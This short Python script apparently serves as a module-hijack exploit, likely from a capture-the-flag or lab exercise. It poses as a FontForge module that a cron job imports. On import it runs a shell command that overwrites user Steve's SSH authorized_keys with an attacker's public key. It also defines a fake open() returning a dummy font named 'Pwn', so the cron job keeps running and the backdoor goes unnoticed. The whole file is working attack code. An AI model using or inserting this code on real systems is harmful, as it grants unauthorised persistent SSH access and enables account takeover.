import os

# 1. Your public key
PUB_KEY = "PUB_KEY"

# 2. Drop the key into Steve's authorized_keys
os.system(f'mkdir -p /home/steve/.ssh && echo "{PUB_KEY}" > /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys')

# 3. Mock the FontForge behavior so the cron job doesn't crash
def open(*args, **kwargs):
    class DummyFont:
        familyname = "Pwn"
        fontname = "Pwn"
        def close(self):
            pass
    return DummyFont()
